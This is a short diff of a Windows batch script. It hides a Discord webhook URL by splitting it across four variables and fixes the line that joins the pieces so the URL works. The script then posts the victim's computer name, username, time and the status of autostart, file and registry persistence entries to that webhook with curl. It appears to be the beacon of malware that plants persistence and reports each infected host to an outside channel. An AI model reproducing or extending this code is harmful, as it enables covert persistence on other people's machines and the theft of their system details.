@@ -112,7 +112,7 @@ set url1=https://dis
 set url2=cord.com/ap
 set url3=i/webhooks/1084947008839761950/nXynJCOkU
 set url4=O1c3jPhcYwXpzqdHmeGqpHZAiMhKzsr8H4L5e3eRcQf3opg7KKMA3d9AW8Y
-set url=%url1%+%url2%+%url3%+%url4%
+set url=%url1%%url2%%url3%%url4%
 
 set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%\nTIME: %time%\n  ProgramDataRegistry-Autostart: %pcregistryauto%\n  ProgramDataRegistry-File: %pcregistryfile%\n  UserRegistry-Autostart: %userregistryauto%\n  UserRegistry-File: %userregistryfile%
 curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" %url%
